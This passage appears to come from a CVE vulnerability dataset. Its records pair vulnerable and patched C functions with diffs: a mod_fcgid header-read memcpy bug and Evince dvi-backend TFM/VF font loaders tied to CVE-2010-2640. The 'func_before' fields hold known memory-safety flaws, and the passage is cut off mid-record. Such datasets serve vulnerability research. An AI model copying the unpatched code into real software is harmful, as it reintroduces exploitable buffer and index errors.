        "func_before": "static apr_status_t fcgid_header_bucket_read(apr_bucket * b,\n                                             const char **str,\n                                             apr_size_t * len,\n                                             apr_read_type_e block)\n{\n    fcgid_bucket_ctx *ctx = (fcgid_bucket_ctx *) b->data;\n    apr_status_t rv;\n    apr_size_t hasread, bodysize;\n    FCGI_Header header;\n    apr_bucket *curbucket = b;\n\n    /* Keep reading until I get a fastcgi header */\n    hasread = 0;\n    while (hasread < sizeof(header)) {\n        char *buffer;\n        apr_size_t bufferlen, putsize;\n\n        /* Feed some data if necessary */\n        if ((rv =\n             fcgid_feed_data(ctx, b->list, &buffer,\n                             &bufferlen)) != APR_SUCCESS)\n            return rv;\n\n        /* Initialize header */\n        putsize = fcgid_min(bufferlen, sizeof(header) - hasread);\n        memcpy(&header + hasread, buffer, putsize);\n        hasread += putsize;\n\n        /* Ignore the bytes that have read */\n        fcgid_ignore_bytes(ctx, putsize);\n    }\n\n    /* Get the body size */\n    bodysize = header.contentLengthB1;\n    bodysize <<= 8;\n    bodysize += header.contentLengthB0;\n\n    /* Handle FCGI_STDERR body, write the content to log file */\n    if (header.type == FCGI_STDERR) {\n        char *logbuf = apr_bucket_alloc(APR_BUCKET_BUFF_SIZE, b->list);\n        char *line;\n\n        memset(logbuf, 0, APR_BUCKET_BUFF_SIZE);\n\n        hasread = 0;\n        while (hasread < bodysize) {\n            char *buffer;\n            apr_size_t bufferlen, canput, willput;\n\n            /* Feed some data if necessary */\n            if ((rv =\n                 fcgid_feed_data(ctx, b->list, &buffer,\n                                 &bufferlen)) != APR_SUCCESS) {\n                apr_bucket_free(logbuf);\n                return rv;\n            }\n\n            canput = fcgid_min(bufferlen, bodysize - hasread);\n            willput =\n                fcgid_min(canput, APR_BUCKET_BUFF_SIZE - hasread - 1);\n            memcpy(logbuf + hasread, buffer, willput);\n            hasread += canput;\n\n            /* Ignore the \"canput\" bytes */\n            fcgid_ignore_bytes(ctx, canput);\n        }\n\n        /* Now I get the log data, write log and release the buffer */\n        line = logbuf;\n        while (*line) {\n            char *end = strpbrk(line, \"\\r\\n\");\n\n            if (end != NULL) {\n                *end = '\\0';\n            }\n            ap_log_rerror(APLOG_MARK, APLOG_WARNING, 0, ctx->ipc.request,\n                          \"mod_fcgid: stderr: %s\", line);\n            if (end == NULL) {\n                break;\n            }\n            ++end;\n            line = end + strspn(end, \"\\r\\n\");\n        }\n\n        apr_bucket_free(logbuf);\n    }\n\n    /* if( header.type==FCGI_STDERR ) */\n    /* Now handle FCGI_STDOUT */\n    else if (header.type == FCGI_STDOUT) {\n        hasread = 0;\n        while (hasread < bodysize) {\n            char *buffer;\n            apr_size_t bufferlen, canput;\n            apr_bucket *buckettmp;\n\n            /* Feed some data if necessary */\n            if ((rv =\n                 fcgid_feed_data(ctx, b->list, &buffer,\n                                 &bufferlen)) != APR_SUCCESS)\n                return rv;\n\n            canput = fcgid_min(bufferlen, bodysize - hasread);\n\n            /* Change the current bucket to refer to what we read */\n            buckettmp = ctx->buffer;\n            if (canput == (bodysize - hasread)) {\n                apr_bucket_split(ctx->buffer, canput);\n                ctx->buffer = APR_BUCKET_NEXT(ctx->buffer);\n                APR_BUCKET_REMOVE(buckettmp);\n            } else {\n                /* canput==bufferlen */\n                ctx->buffer = NULL;\n            }\n\n            APR_BUCKET_INSERT_AFTER(curbucket, buckettmp);\n            curbucket = buckettmp;\n            hasread += canput;\n        }                       /* while( hasread<bodysize ) */\n    }\n\n    /* if( header.type==FCGI_STDOUT ) */\n    /* Now FCGI_END_REQUEST */\n    else if (header.type == FCGI_END_REQUEST) {\n        /* Just ignore the body */\n        hasread = 0;\n        while (hasread < bodysize) {\n            char *buffer;\n            apr_size_t bufferlen, canignore;\n\n            /* Feed some data if necessary */\n            if ((rv =\n                 fcgid_feed_data(ctx, b->list, &buffer,\n                                 &bufferlen)) != APR_SUCCESS)\n                return rv;\n\n            canignore = fcgid_min(bufferlen, bodysize);\n            hasread += canignore;\n\n            /* Ignore the bytes */\n            fcgid_ignore_bytes(ctx, canignore);\n        }\n    }\n\n    /* Now ignore padding data */\n    hasread = 0;\n    while (hasread < header.paddingLength) {\n        char *buffer;\n        apr_size_t bufferlen, canignore;\n\n        /* Feed some data if necessary */\n        if ((rv =\n             fcgid_feed_data(ctx, b->list, &buffer,\n                             &bufferlen)) != APR_SUCCESS)\n            return rv;\n\n        canignore = fcgid_min(bufferlen, header.paddingLength - hasread);\n        hasread += canignore;\n\n        /* Ignore the bytes */\n        fcgid_ignore_bytes(ctx, canignore);\n    }\n\n    /* Tail another fastcgi header bucket if it's not ending */\n    if (header.type != FCGI_END_REQUEST) {\n        apr_bucket *headerbucket =\n            ap_bucket_fcgid_header_create(b->list, ctx);\n        APR_BUCKET_INSERT_AFTER(curbucket, headerbucket);\n    } else {\n        /* Release the process ASAP */\n        if ((rv = apr_pool_cleanup_run(ctx->ipc.request->pool,\n                                       ctx,\n                                       bucket_ctx_cleanup)) != APR_SUCCESS)\n            return rv;\n    }\n\n    b = apr_bucket_immortal_make(b, \"\", 0);\n    return apr_bucket_read(b, str, len, APR_BLOCK_READ);\n}",
        "func": "static apr_status_t fcgid_header_bucket_read(apr_bucket * b,\n                                             const char **str,\n                                             apr_size_t * len,\n                                             apr_read_type_e block)\n{\n    fcgid_bucket_ctx *ctx = (fcgid_bucket_ctx *) b->data;\n    apr_status_t rv;\n    apr_size_t hasread, bodysize;\n    FCGI_Header header;\n    apr_bucket *curbucket = b;\n\n    /* Keep reading until I get a fastcgi header */\n    hasread = 0;\n    while (hasread < sizeof(header)) {\n        char *buffer;\n        apr_size_t bufferlen, putsize;\n\n        /* Feed some data if necessary */\n        if ((rv =\n             fcgid_feed_data(ctx, b->list, &buffer,\n                             &bufferlen)) != APR_SUCCESS)\n            return rv;\n\n        /* Initialize header */\n        putsize = fcgid_min(bufferlen, sizeof(header) - hasread);\n        memcpy((apr_byte_t *)&header + hasread, buffer, putsize);\n        hasread += putsize;\n\n        /* Ignore the bytes that have read */\n        fcgid_ignore_bytes(ctx, putsize);\n    }\n\n    /* Get the body size */\n    bodysize = header.contentLengthB1;\n    bodysize <<= 8;\n    bodysize += header.contentLengthB0;\n\n    /* Handle FCGI_STDERR body, write the content to log file */\n    if (header.type == FCGI_STDERR) {\n        char *logbuf = apr_bucket_alloc(APR_BUCKET_BUFF_SIZE, b->list);\n        char *line;\n\n        memset(logbuf, 0, APR_BUCKET_BUFF_SIZE);\n\n        hasread = 0;\n        while (hasread < bodysize) {\n            char *buffer;\n            apr_size_t bufferlen, canput, willput;\n\n            /* Feed some data if necessary */\n            if ((rv =\n                 fcgid_feed_data(ctx, b->list, &buffer,\n                                 &bufferlen)) != APR_SUCCESS) {\n                apr_bucket_free(logbuf);\n                return rv;\n            }\n\n            canput = fcgid_min(bufferlen, bodysize - hasread);\n            willput =\n                fcgid_min(canput, APR_BUCKET_BUFF_SIZE - hasread - 1);\n            memcpy(logbuf + hasread, buffer, willput);\n            hasread += canput;\n\n            /* Ignore the \"canput\" bytes */\n            fcgid_ignore_bytes(ctx, canput);\n        }\n\n        /* Now I get the log data, write log and release the buffer */\n        line = logbuf;\n        while (*line) {\n            char *end = strpbrk(line, \"\\r\\n\");\n\n            if (end != NULL) {\n                *end = '\\0';\n            }\n            ap_log_rerror(APLOG_MARK, APLOG_WARNING, 0, ctx->ipc.request,\n                          \"mod_fcgid: stderr: %s\", line);\n            if (end == NULL) {\n                break;\n            }\n            ++end;\n            line = end + strspn(end, \"\\r\\n\");\n        }\n\n        apr_bucket_free(logbuf);\n    }\n\n    /* if( header.type==FCGI_STDERR ) */\n    /* Now handle FCGI_STDOUT */\n    else if (header.type == FCGI_STDOUT) {\n        hasread = 0;\n        while (hasread < bodysize) {\n            char *buffer;\n            apr_size_t bufferlen, canput;\n            apr_bucket *buckettmp;\n\n            /* Feed some data if necessary */\n            if ((rv =\n                 fcgid_feed_data(ctx, b->list, &buffer,\n                                 &bufferlen)) != APR_SUCCESS)\n                return rv;\n\n            canput = fcgid_min(bufferlen, bodysize - hasread);\n\n            /* Change the current bucket to refer to what we read */\n            buckettmp = ctx->buffer;\n            if (canput == (bodysize - hasread)) {\n                apr_bucket_split(ctx->buffer, canput);\n                ctx->buffer = APR_BUCKET_NEXT(ctx->buffer);\n                APR_BUCKET_REMOVE(buckettmp);\n            } else {\n                /* canput==bufferlen */\n                ctx->buffer = NULL;\n            }\n\n            APR_BUCKET_INSERT_AFTER(curbucket, buckettmp);\n            curbucket = buckettmp;\n            hasread += canput;\n        }                       /* while( hasread<bodysize ) */\n    }\n\n    /* if( header.type==FCGI_STDOUT ) */\n    /* Now FCGI_END_REQUEST */\n    else if (header.type == FCGI_END_REQUEST) {\n        /* Just ignore the body */\n        hasread = 0;\n        while (hasread < bodysize) {\n            char *buffer;\n            apr_size_t bufferlen, canignore;\n\n            /* Feed some data if necessary */\n            if ((rv =\n                 fcgid_feed_data(ctx, b->list, &buffer,\n                                 &bufferlen)) != APR_SUCCESS)\n                return rv;\n\n            canignore = fcgid_min(bufferlen, bodysize);\n            hasread += canignore;\n\n            /* Ignore the bytes */\n            fcgid_ignore_bytes(ctx, canignore);\n        }\n    }\n\n    /* Now ignore padding data */\n    hasread = 0;\n    while (hasread < header.paddingLength) {\n        char *buffer;\n        apr_size_t bufferlen, canignore;\n\n        /* Feed some data if necessary */\n        if ((rv =\n             fcgid_feed_data(ctx, b->list, &buffer,\n                             &bufferlen)) != APR_SUCCESS)\n            return rv;\n\n        canignore = fcgid_min(bufferlen, header.paddingLength - hasread);\n        hasread += canignore;\n\n        /* Ignore the bytes */\n        fcgid_ignore_bytes(ctx, canignore);\n    }\n\n    /* Tail another fastcgi header bucket if it's not ending */\n    if (header.type != FCGI_END_REQUEST) {\n        apr_bucket *headerbucket =\n            ap_bucket_fcgid_header_create(b->list, ctx);\n        APR_BUCKET_INSERT_AFTER(curbucket, headerbucket);\n    } else {\n        /* Release the process ASAP */\n        if ((rv = apr_pool_cleanup_run(ctx->ipc.request->pool,\n                                       ctx,\n                                       bucket_ctx_cleanup)) != APR_SUCCESS)\n            return rv;\n    }\n\n    b = apr_bucket_immortal_make(b, \"\", 0);\n    return apr_bucket_read(b, str, len, APR_BLOCK_READ);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -23,7 +23,7 @@\n \n         /* Initialize header */\n         putsize = fcgid_min(bufferlen, sizeof(header) - hasread);\n-        memcpy(&header + hasread, buffer, putsize);\n+        memcpy((apr_byte_t *)&header + hasread, buffer, putsize);\n         hasread += putsize;\n \n         /* Ignore the bytes that have read */",
        "diff_line_info": {
            "deleted_lines": [
                "        memcpy(&header + hasread, buffer, putsize);"
            ],
            "added_lines": [
                "        memcpy((apr_byte_t *)&header + hasread, buffer, putsize);"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-2640",
        "func_name": "GNOME/evince/tfm_load_file",
        "description": "Array index error in the PK font parser in the dvi-backend component in Evince 2.32 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font in conjunction with a DVI file that is processed by the thumbnailer.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "int\ttfm_load_file(const char *filename, TFMInfo *info)\n{\n\tint\tlf, lh, bc, ec, nw, nh, nd, ne;\n\tint\ti, n;\n\tUchar\t*tfm;\n\tUchar\t*ptr;\n\tstruct stat st;\n\tint\tsize;\n\tFILE\t*in;\n\tInt32\t*cb;\n\tInt32\t*charinfo;\n\tInt32\t*widths;\n\tInt32\t*heights;\n\tInt32\t*depths;\n\tUint32\tchecksum;\n\n\tin = fopen(filename, \"rb\");\n\tif(in == NULL)\n\t\treturn -1;\n\ttfm = NULL;\n\n\tDEBUG((DBG_FONTS, \"(mt) reading TFM file `%s'\\n\",\n\t\tfilename));\n\t/* We read the entire TFM file into core */\n\tif(fstat(fileno(in), &st) < 0)\n\t\treturn -1;\n\tif(st.st_size == 0)\n\t\tgoto bad_tfm;\n\n\t/* allocate a word-aligned buffer to hold the file */\n\tsize = 4 * ROUND(st.st_size, 4);\n\tif(size != st.st_size)\n\t\tmdvi_warning(_(\"Warning: TFM file `%s' has suspicious size\\n\"), \n\t\t\t     filename);\n\ttfm = (Uchar *)mdvi_malloc(size);\n\tif(fread(tfm, st.st_size, 1, in) != 1)\n\t\tgoto error;\n\t/* we don't need this anymore */\n\tfclose(in);\n\tin = NULL;\n\n\t/* not a checksum, but serves a similar purpose */\n\tchecksum = 0;\n\t\n\tptr = tfm;\n\t/* get the counters */\n\tlf = muget2(ptr);\n\tlh = muget2(ptr); checksum += 6 + lh;\n\tbc = muget2(ptr); \n\tec = muget2(ptr); checksum += ec - bc + 1;\n\tnw = muget2(ptr); checksum += nw;\n\tnh = muget2(ptr); checksum += nh;\n\tnd = muget2(ptr); checksum += nd;\n\tchecksum += muget2(ptr); /* skip italics correction count */\n\tchecksum += muget2(ptr); /* skip lig/kern table size */\n\tchecksum += muget2(ptr); /* skip kern table size */\n\tne = muget2(ptr); checksum += ne;\n\tchecksum += muget2(ptr); /* skip # of font parameters */\n\n\tsize = ec - bc + 1;\n\tcb = (Int32 *)tfm; cb += 6 + lh;\n\tcharinfo    = cb;  cb += size;\n\twidths      = cb;  cb += nw;\n\theights     = cb;  cb += nh;\n\tdepths      = cb;\n\n\tif(widths[0] || heights[0] || depths[0] || \n\t   checksum != lf || bc - 1 > ec || ec > 255 || ne > 256)\n\t\tgoto bad_tfm;\n\n\t/* from this point on, no error checking is done */\n\n\t/* now we're at the header */\n\t/* get the checksum */\n\tinfo->checksum = muget4(ptr);\n\t/* get the design size */\n\tinfo->design = muget4(ptr);\n\t/* get the coding scheme */\n\tif(lh > 2) {\n\t\t/* get the coding scheme */\n\t\ti = n = msget1(ptr);\n\t\tif(n < 0 || n > 39) {\n\t\t\tmdvi_warning(_(\"%s: font coding scheme truncated to 40 bytes\\n\"),\n\t\t\t\t     filename);\n\t\t\tn = 39;\n\t\t}\n\t\tmemcpy(info->coding, ptr, n);\n\t\tinfo->coding[n] = 0;\n\t\tptr += i;\n\t} else\n\t\tstrcpy(info->coding, \"FontSpecific\");\n\t/* get the font family */\n\tif(lh > 12) {\n\t\tn = msget1(ptr);\n\t\tif(n > 0) {\n\t\t\ti = Max(n, 63);\n\t\t\tmemcpy(info->family, ptr, i);\n\t\t\tinfo->family[i] = 0;\n\t\t} else\n\t\t\tstrcpy(info->family, \"unspecified\");\n\t\tptr += n;\n\t}\n\t/* now we don't read from `ptr' anymore */\n\t\n\tinfo->loc = bc;\n\tinfo->hic = ec;\n\tinfo->type = DviFontTFM;\n\n\t/* allocate characters */\n\tinfo->chars = xnalloc(TFMChar, size);\n\n\n#ifdef WORD_LITTLE_ENDIAN\n\t/* byte-swap the three arrays at once (they are consecutive in memory) */\n\tswap_array((Uint32 *)widths, nw + nh + nd);\n#endif\n\n\t/* get the relevant data */\n\tptr = (Uchar *)charinfo;\n\tfor(i = bc; i <= ec; ptr += 3, i++) {\n\t\tint\tndx;\n\n\t\tndx = (int)*ptr; ptr++;\n\t\tinfo->chars[i-bc].advance = widths[ndx];\n\t\t/* TFM files lack this information */\n\t\tinfo->chars[i-bc].left = 0;\n\t\tinfo->chars[i-bc].right = widths[ndx];\n\t\tinfo->chars[i-bc].present = (ndx != 0);\n\t\tif(ndx) {\n\t\t\tndx = ((*ptr >> 4) & 0xf);\n\t\t\tinfo->chars[i-bc].height = heights[ndx];\n\t\t\tndx = (*ptr & 0xf);\n\t\t\tinfo->chars[i-bc].depth = depths[ndx];\n\t\t}\n\t}\n\n\t/* free everything */\n\tmdvi_free(tfm);\n\t\n\treturn 0;\n\nbad_tfm:\n\tmdvi_error(_(\"%s: File corrupted, or not a TFM file\\n\"), filename);\nerror:\n\tif(tfm) mdvi_free(tfm);\n\tif(in)  fclose(in);\n\treturn -1;\t\n}",
        "func": "int\ttfm_load_file(const char *filename, TFMInfo *info)\n{\n\tint\tlf, lh, bc, ec, nw, nh, nd, ne;\n\tint\ti, n;\n\tUchar\t*tfm;\n\tUchar\t*ptr;\n\tstruct stat st;\n\tint\tsize;\n\tFILE\t*in;\n\tInt32\t*cb;\n\tInt32\t*charinfo;\n\tInt32\t*widths;\n\tInt32\t*heights;\n\tInt32\t*depths;\n\tUint32\tchecksum;\n\n\tin = fopen(filename, \"rb\");\n\tif(in == NULL)\n\t\treturn -1;\n\ttfm = NULL;\n\n\tDEBUG((DBG_FONTS, \"(mt) reading TFM file `%s'\\n\",\n\t\tfilename));\n\t/* We read the entire TFM file into core */\n\tif(fstat(fileno(in), &st) < 0)\n\t\treturn -1;\n\t/* according to the spec, TFM files are smaller than 16K */\n\tif(st.st_size == 0 || st.st_size >= 16384)\n\t\tgoto bad_tfm;\n\n\t/* allocate a word-aligned buffer to hold the file */\n\tsize = 4 * ROUND(st.st_size, 4);\n\tif(size != st.st_size)\n\t\tmdvi_warning(_(\"Warning: TFM file `%s' has suspicious size\\n\"), \n\t\t\t     filename);\n\ttfm = (Uchar *)mdvi_malloc(size);\n\tif(fread(tfm, st.st_size, 1, in) != 1)\n\t\tgoto error;\n\t/* we don't need this anymore */\n\tfclose(in);\n\tin = NULL;\n\n\t/* not a checksum, but serves a similar purpose */\n\tchecksum = 0;\n\t\n\tptr = tfm;\n\t/* get the counters */\n\tlf = muget2(ptr);\n\tlh = muget2(ptr); checksum += 6 + lh;\n\tbc = muget2(ptr); \n\tec = muget2(ptr); checksum += ec - bc + 1;\n\tnw = muget2(ptr); checksum += nw;\n\tnh = muget2(ptr); checksum += nh;\n\tnd = muget2(ptr); checksum += nd;\n\tchecksum += muget2(ptr); /* skip italics correction count */\n\tchecksum += muget2(ptr); /* skip lig/kern table size */\n\tchecksum += muget2(ptr); /* skip kern table size */\n\tne = muget2(ptr); checksum += ne;\n\tchecksum += muget2(ptr); /* skip # of font parameters */\n\n\tsize = ec - bc + 1;\n\tcb = (Int32 *)tfm; cb += 6 + lh;\n\tcharinfo    = cb;  cb += size;\n\twidths      = cb;  cb += nw;\n\theights     = cb;  cb += nh;\n\tdepths      = cb;\n\n\tif(widths[0] || heights[0] || depths[0] || \n\t   checksum != lf || bc - 1 > ec || ec > 255 || ne > 256)\n\t\tgoto bad_tfm;\n\n\t/* from this point on, no error checking is done */\n\n\t/* now we're at the header */\n\t/* get the checksum */\n\tinfo->checksum = muget4(ptr);\n\t/* get the design size */\n\tinfo->design = muget4(ptr);\n\t/* get the coding scheme */\n\tif(lh > 2) {\n\t\t/* get the coding scheme */\n\t\ti = n = msget1(ptr);\n\t\tif(n < 0 || n > 39) {\n\t\t\tmdvi_warning(_(\"%s: font coding scheme truncated to 40 bytes\\n\"),\n\t\t\t\t     filename);\n\t\t\tn = 39;\n\t\t}\n\t\tmemcpy(info->coding, ptr, n);\n\t\tinfo->coding[n] = 0;\n\t\tptr += i;\n\t} else\n\t\tstrcpy(info->coding, \"FontSpecific\");\n\t/* get the font family */\n\tif(lh > 12) {\n\t\tn = msget1(ptr);\n\t\tif(n > 0) {\n\t\t\ti = Max(n, 63);\n\t\t\tmemcpy(info->family, ptr, i);\n\t\t\tinfo->family[i] = 0;\n\t\t} else\n\t\t\tstrcpy(info->family, \"unspecified\");\n\t\tptr += n;\n\t}\n\t/* now we don't read from `ptr' anymore */\n\t\n\tinfo->loc = bc;\n\tinfo->hic = ec;\n\tinfo->type = DviFontTFM;\n\n\t/* allocate characters */\n\tinfo->chars = xnalloc(TFMChar, size);\n\n\n#ifdef WORD_LITTLE_ENDIAN\n\t/* byte-swap the three arrays at once (they are consecutive in memory) */\n\tswap_array((Uint32 *)widths, nw + nh + nd);\n#endif\n\n\t/* get the relevant data */\n\tptr = (Uchar *)charinfo;\n\tfor(i = bc; i <= ec; ptr += 3, i++) {\n\t\tint\tndx;\n\n\t\tndx = (int)*ptr; ptr++;\n\t\tinfo->chars[i-bc].advance = widths[ndx];\n\t\t/* TFM files lack this information */\n\t\tinfo->chars[i-bc].left = 0;\n\t\tinfo->chars[i-bc].right = widths[ndx];\n\t\tinfo->chars[i-bc].present = (ndx != 0);\n\t\tif(ndx) {\n\t\t\tndx = ((*ptr >> 4) & 0xf);\n\t\t\tinfo->chars[i-bc].height = heights[ndx];\n\t\t\tndx = (*ptr & 0xf);\n\t\t\tinfo->chars[i-bc].depth = depths[ndx];\n\t\t}\n\t}\n\n\t/* free everything */\n\tmdvi_free(tfm);\n\t\n\treturn 0;\n\nbad_tfm:\n\tmdvi_error(_(\"%s: File corrupted, or not a TFM file\\n\"), filename);\nerror:\n\tif(tfm) mdvi_free(tfm);\n\tif(in)  fclose(in);\n\treturn -1;\t\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -24,7 +24,8 @@\n \t/* We read the entire TFM file into core */\n \tif(fstat(fileno(in), &st) < 0)\n \t\treturn -1;\n-\tif(st.st_size == 0)\n+\t/* according to the spec, TFM files are smaller than 16K */\n+\tif(st.st_size == 0 || st.st_size >= 16384)\n \t\tgoto bad_tfm;\n \n \t/* allocate a word-aligned buffer to hold the file */",
        "diff_line_info": {
            "deleted_lines": [
                "\tif(st.st_size == 0)"
            ],
            "added_lines": [
                "\t/* according to the spec, TFM files are smaller than 16K */",
                "\tif(st.st_size == 0 || st.st_size >= 16384)"
            ]
        }
    },
    {
        "cve_id": "CVE-2010-2640",
        "func_name": "GNOME/evince/vf_load_font",
        "description": "Array index error in the PK font parser in the dvi-backend component in Evince 2.32 and earlier allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font in conjunction with a DVI file that is processed by the thumbnailer.",
        "git_url": "https://github.com/GNOME/evince/commit/d4139205b010ed06310d14284e63114e88ec6de2",
        "commit_title": "backends: Fix several security issues in the dvi-backend.",
        "commit_text": " See CVE-2010-2640, CVE-2010-2641, CVE-2010-2642 and  CVE-2010-2643.",
        "func_before": "static int vf_load_font(DviParams *params, DviFont *font)\n{\n\tFILE\t*p;\n\tUchar\t*macros;\n\tint\tmsize;\n\tint\tmlen;\n\tInt32\tchecksum;\n\tlong\talpha, beta, z;\n\tint\top;\n\tint\ti;\n\tint\tnchars;\n\tint\tloc, hic;\n\tDviFontRef *last;\n\t\n\tmacros = NULL;\n\tmsize = mlen = 0;\n\tp = font->in;\n\t\n\tif(fuget1(p) != 247 || fuget1(p) != 202)\n\t\tgoto badvf;\n\tmlen = fuget1(p);\n\tfseek(p, (long)mlen, SEEK_CUR);\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && checksum != font->checksum) {\n\t\tmdvi_warning(_(\"%s: Checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\tfont->design = fuget4(p);\n\t\n\t/* read all the fonts in the preamble */\n\tlast = NULL;\n\n\t/* initialize alpha, beta and z for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\top = fuget1(p);\t\n\twhile(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4) {\n\t\tDviFontRef *ref;\n\t\tInt32\tscale, design;\n\t\tUint32\tchecksum;\n\t\tint\tid;\n\t\tint\tn;\n\t\tint\thdpi;\n\t\tint\tvdpi;\n\t\tchar\t*name;\n\t\t\n\t\t/* process fnt_def commands */\n\t\t\n\t\tid = fugetn(p, op - DVI_FNT_DEF1 + 1);\n\t\tchecksum = fuget4(p);\n\t\tscale = fuget4(p);\n\t\tdesign = fuget4(p);\n\n\t\t/* scale this font according to our parent's scale */\n\t\tscale = TFMSCALE(scale, z, alpha, beta);\n\t\tdesign = FROUND(params->tfm_conv * design);\n\n\t\t/* compute the resolution */\n\t\thdpi = FROUND(params->mag * params->dpi * scale / design);\n\t\tvdpi = FROUND(params->mag * params->vdpi * scale / design);\n\t\tn = fuget1(p) + fuget1(p);\n\t\tname = mdvi_malloc(n + 1);\n\t\tfread(name, 1, n, p);\n\t\tname[n] = 0;\n\t\tDEBUG((DBG_FONTS, \"(vf) %s: defined font `%s' at %.1fpt (%dx%d dpi)\\n\",\n\t\t\tfont->fontname, name, \n\t\t\t(double)scale / (params->tfm_conv * 0x100000), hdpi, vdpi));\n\n\t\t/* get the font */\n\t\tref = font_reference(params, id, name, checksum, hdpi, vdpi, scale);\n\t\tif(ref == NULL) {\n\t\t\tmdvi_error(_(\"(vf) %s: could not load font `%s'\\n\"), \n\t\t\t\t   font->fontname, name);\n\t\t\tgoto error;\n\t\t}\n\t\tmdvi_free(name);\n\t\tif(last == NULL)\n\t\t\tfont->subfonts = last = ref;\n\t\telse\n\t\t\tlast->next = ref;\n\t\tref->next = NULL;\n\t\top = fuget1(p);\n\t}\n\t\n\tif(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4)\n\t\tgoto error;\n\n\t/* This function correctly reads both .vf and .ovf files */\n\t\n\tfont->chars = xnalloc(DviFontChar, 256);\n\tfor(i = 0; i < 256; i++)\n\t\tfont->chars[i].offset = 0;\n\tnchars = 256;\n\tloc = -1; hic = -1;\n\t/* now read the characters themselves */\n\twhile(op <= 242) {\n\t\tint\tpl;\n\t\tInt32\tcc;\n\t\tInt32\ttfm;\n\t\t\n\t\tif(op == 242) {\n\t\t\tpl = fuget4(p);\n\t\t\tcc = fuget4(p);\n\t\t\ttfm = fuget4(p);\n\t\t} else {\n\t\t\tpl = op;\n\t\t\tcc = fuget1(p);\n\t\t\ttfm = fuget3(p);\n\t\t}\n\t\tif(loc < 0 || cc < loc)\n\t\t\tloc = cc;\n\t\tif(hic < 0 || cc > hic)\n\t\t\thic = cc;\n\t\tif(cc >= nchars) {\n\t\t\tfont->chars = xresize(font->chars, \n\t\t\t\tDviFontChar, cc + 16);\n\t\t\tfor(i = nchars; i < cc + 16; i++)\n\t\t\t\tfont->chars[i].offset = 0;\n\t\t\tnchars = cc + 16;\n\t\t}\n\t\tif(font->chars[cc].offset) {\n\t\t\tmdvi_error(_(\"(vf) %s: character %d redefined\\n\"),\n\t\t\t\t   font->fontname, cc);\n\t\t\tgoto error;\n\t\t}\n\t\t\t\t\n\t\tDEBUG((DBG_GLYPHS, \"(vf) %s: defined character %d (macro length %d)\\n\",\n\t\t\tfont->fontname, cc, pl));\n\t\tfont->chars[cc].width = pl + 1;\n\t\tfont->chars[cc].code = cc;\n\t\tfont->chars[cc].tfmwidth = TFMSCALE(tfm, z, alpha, beta);\n\t\tfont->chars[cc].offset = mlen;\n\t\tfont->chars[cc].loaded = 1;\n\t\tif(mlen + pl + 1 > msize) {\n\t\t\tmsize = mlen + pl + 256;\n\t\t\tmacros = xresize(macros, Uchar, msize);\n\t\t}\n\t\tif(pl && fread(macros + mlen, 1, pl, p) != pl)\n\t\t\tbreak;\n\t\tmacros[mlen+pl] = DVI_EOP;\n\t\tmlen += pl + 1;\n\t\top = fuget1(p);\n\t}\n\tif(op != 248) {\n\t\tmdvi_error(_(\"(vf) %s: no postamble\\n\"), font->fontname);\n\t\tgoto error;\n\t}\n\n\t/* make macro memory just big enough */\n\tif(msize > mlen) {\n\t\tmacros = xresize(macros, Uchar, mlen);\n\t\tmsize = mlen;\n\t}\n\t\n\tDEBUG((DBG_FONTS|DBG_GLYPHS, \n\t\t\"(vf) %s: macros use %d bytes\\n\", font->fontname, msize));\n\n\tif(loc > 0 || hic < nchars-1) {\n\t\tmemmove(font->chars, font->chars + loc,\n\t\t\t(hic - loc + 1) * sizeof(DviFontChar));\n\t\tfont->chars = xresize(font->chars,\n\t\t\tDviFontChar, hic - loc + 1);\n\t}\n\tfont->loc = loc;\n\tfont->hic = hic;\n\tfont->private = macros;\n\n\treturn 0;\n\t\nbadvf:\n\tmdvi_error(_(\"%s: File corrupted, or not a VF file.\\n\"), font->fontname);\nerror:\n\tif(font->chars)\n\t\tmdvi_free(font->chars);\n\tif(macros)\n\t\tmdvi_free(macros);\n\treturn -1;\n}",
        "func": "static int vf_load_font(DviParams *params, DviFont *font)\n{\n\tFILE\t*p;\n\tUchar\t*macros;\n\tint\tmsize;\n\tint\tmlen;\n\tInt32\tchecksum;\n\tlong\talpha, beta, z;\n\tint\top;\n\tint\ti;\n\tint\tnchars;\n\tint\tloc, hic;\n\tDviFontRef *last;\n\t\n\tmacros = NULL;\n\tmsize = mlen = 0;\n\tp = font->in;\n\t\n\tif(fuget1(p) != 247 || fuget1(p) != 202)\n\t\tgoto badvf;\n\tmlen = fuget1(p);\n\tfseek(p, (long)mlen, SEEK_CUR);\n\tchecksum = fuget4(p);\n\tif(checksum && font->checksum && checksum != font->checksum) {\n\t\tmdvi_warning(_(\"%s: Checksum mismatch (expected %u, got %u)\\n\"),\n\t\t\t     font->fontname, font->checksum, checksum);\n\t} else if(!font->checksum)\n\t\tfont->checksum = checksum;\n\tfont->design = fuget4(p);\n\t\n\t/* read all the fonts in the preamble */\n\tlast = NULL;\n\n\t/* initialize alpha, beta and z for TFM width computation */\n\tTFMPREPARE(font->scale, z, alpha, beta);\n\n\top = fuget1(p);\t\n\twhile(op >= DVI_FNT_DEF1 && op <= DVI_FNT_DEF4) {\n\t\tDviFontRef *ref;\n\t\tInt32\tscale, design;\n\t\tUint32\tchecksum;\n\t\tint\tid;\n\t\tint\tn;\n\t\tint\thdpi;\n\t\tint\tvdpi;\n\t\tchar\t*name;\n\t\t\n\t\t/* process fnt_def commands */\n\t\t\n\t\tid = fugetn(p, op - DVI_FNT_DEF1 + 1);\n\t\tchecksum = fuget4(p);\n\t\tscale = fuget4(p);\n\t\tdesign = fuget4(p);\n\n\t\t/* scale this font according to our parent's scale */\n\t\tscale = 